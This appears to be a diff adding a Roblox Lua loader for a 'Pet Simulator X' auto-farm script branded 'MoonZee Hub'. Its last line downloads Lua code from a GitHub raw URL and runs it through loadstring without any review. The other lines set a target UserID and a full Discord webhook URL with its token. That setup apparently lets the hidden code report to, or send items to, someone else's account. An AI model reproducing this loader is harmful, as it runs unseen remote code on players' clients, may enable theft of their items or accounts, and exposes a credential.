@@ -1,0 +1,4 @@
+_G.UserID = 2934243631
+_G.WebHook = "https://discord.com/api/webhooks/1062704842256162867/lbfPCDE2VD7EoNGF_tt3RzX2Tpft8sF3No7HFh_1Nf6GBRHpPxrp6tUsN-I0xUDMDh6Z"
+_G.LoadingScreenText = "MoonZee Hub"
+loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
